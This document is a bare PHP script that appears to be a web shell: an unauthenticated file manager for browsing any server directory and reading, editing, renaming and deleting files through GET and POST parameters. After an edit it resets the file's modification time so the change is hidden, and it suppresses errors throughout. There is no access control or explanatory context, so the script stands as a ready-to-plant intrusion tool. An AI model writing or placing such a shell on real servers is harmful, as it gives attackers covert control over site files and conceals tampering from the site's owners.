<?php
// regex => files(dir, '/\.html$/')
date_default_timezone_set("Asia/Jakarta");
function files($type, $relativePath = false, $pattern = '', $result = array()) {
	$result = [];
	foreach (scandir(getcwd()) as $key => $value) {
		$file['name'] = getcwd().DIRECTORY_SEPARATOR.$value;
		switch ($type) {
			case 'dir':
				if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;
					$result[] = $file;
				break;
			
			case 'file':
				if (!is_file($file['name'])) continue 2;
					if(empty($pattern) || preg_match($pattern, $file['name'])) $result[] = $file;
				break;
		}
	} return $result;
}
function redirect($url) {
	return '<meta http-equiv="refresh" content="0; url='.$url.'>';
}
function home_root() {
	return $_SERVER['DOCUMENT_ROOT'];
}
function countdir($dir) {
	return @count(scandir($dir)) - 2;
}
function delete($filename) {
	if (is_dir($filename)) {
		foreach (scandir($filename) as $key => $value) {
			if ($value != '.' && $value != '..') {
				if (is_dir($filename.DIRECTORY_SEPARATOR.$value)) {
					delete($filename.DIRECTORY_SEPARATOR.$value);
				} else {
					@unlink($filename.DIRECTORY_SEPARATOR.$value);
				}
			}
			if (@rmdir($filename)) {
				return true;
			} else {
				return false;
			}
		}
	} else {
		if (@unlink($filename)) {
			return true;
		} else {
			return false;
		}
	}
}
function fsize($filename) {
	if (is_file($filename)) {
		$filepath = $filename;
		if (!realpath($filepath)) {
			$filepath = home_root().$filepath;
		}
		$fsize = filesize($filepath);
		$array = [" TB"," GB"," MB"," KB"," Byte"];
		$total = count($array);
		while ($total -- && $fsize > 1024) {
			$fsize /= 1024; 
		} return round($fsize, 2)."".$array[$total];
	} else {
		return countdir($filename). " items";
	}
}
function ftime($filename) {
	return date("d/m/Y H:i:s", @filemtime($filename));
}
function freadf($filename) {
	return htmlspecialchars(file_get_contents($filename));
}
function frename($filename, $newname) {
	return rename($filename, getcwd().DIRECTORY_SEPARATOR.$newname);
}
function fedit($filename, $data) {
	$key = true;
	$handle = fopen($filename, "wb");
	if (!@fwrite($handle, $data)) {
		@chmod($filename, "0666");
		$key = @fwrite($handle, $data) ? true : false;
	} fclose($handle);
	return $key;
}
if (isset($_GET['cd'])) {
	@chdir($_GET['cd']);
}
?>
<table>
	<?php
	switch (@$_POST['action']) {
		case 'fraw':
			?>
			<pre><?= freadf($_POST['file']) ?></pre>
			<?php
			exit();
			break;
	
		case 'fedit':
			if (isset($_POST['submit'])) {
				$message = null;
				if (!empty($_POST['file'])) {
					if (fedit($_POST['file'], $_POST['data'])) {
						print("saved");
						@touch($_POST['file'], @strtotime($_POST['ftime']));
					} else {
						print("failed to saved");
					}
				}
			}
			?>
			<tr>
				<td>
					Filename : <?= $_POST['file'] ?>
				</td>
			</tr>
			<tr>
			<form method="post">
				<td>
					Last Modified : <input type="text" name="ftime" value="<?= ftime($_POST['file']) ?>">
				</td>
			</tr>
			<tr>
				<td>
					<textarea name="data"><?= freadf($_POST['file']) ?></textarea>
				</td>
			</tr>
				<tr>
					<td>
						<input type="hidden" name="action" value="fedit">
						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
						<input type="submit" name="submit" value="save">
					</td>
				</tr>
			</form>
			<?php
			exit();
			break;
		case 'frename':
			if (isset($_POST['submit'])) {
				if (frename($_POST['file'], $_POST['newname'])) {
					redirect("?cd=".getcwd()."");
					@touch($_POST['file'], @strtotime($_POST['ftime']));
					delete($_POST['file']);
				} else {
					print("rename failed");
				}
			}
			?>
			<form method="post">
				<tr>
					<td>
						<input type="hidden" name="action" value="frename">
						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
						<input type="hidden" name="ftime" value="<?= ftime($_POST['file']) ?>">
						<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
					</td>
					<td>
						<input type="submit" name="submit" value="rename">
					</td>
				</tr>
			</form>
			<?php
			break;
		case 'fdelete':
			delete($_POST['file']);
			break;
	}
	?>
	<tr>
		<th>Name</th>
		<th>Size</th>
		<th>Last Modified</th>
		<th>Action</th>
	</tr>
	<?php
	foreach (files('dir') as $key => $value) { ?>
		<tr>
			<td>
				<a href="?cd=<?= $value['name'] ?>"><?= basename($value['name']) ?></a>
			</td>
			<td>
				<?= fsize($value['name']) ?>
			</td>
			<td>
				<?= ftime($value['name']) ?>
			</td>
			<td></td>
		</tr>
	<?php }
	foreach (files('file') as $key => $value) { ?>
		<tr>
			<form method="post" action="#raw=<?= $value['name'] ?>" target="_blank">
				<td>
					<input type="hidden" name="file" value="<?= $value['name'] ?>">
					<button name="action" value="fraw"><?= basename($value['name']) ?></button>
				</td>
			</form>
			<td>
				<?= fsize($value['name']) ?>
			</td>
			<td>
				<?= ftime($value['name']) ?>
			</td>
			<form method="post">
				<td>
					<input type="hidden" name="file" value="<?= $value['name'] ?>">
					<button name="action" value="fedit">Edit</button>
					<button name="action" value="frename">Rename</button>
					<button name="action" value="fdelete">Delete</button>
				</td>
			</form>
		</tr>
	<?php }
	?>
</table>
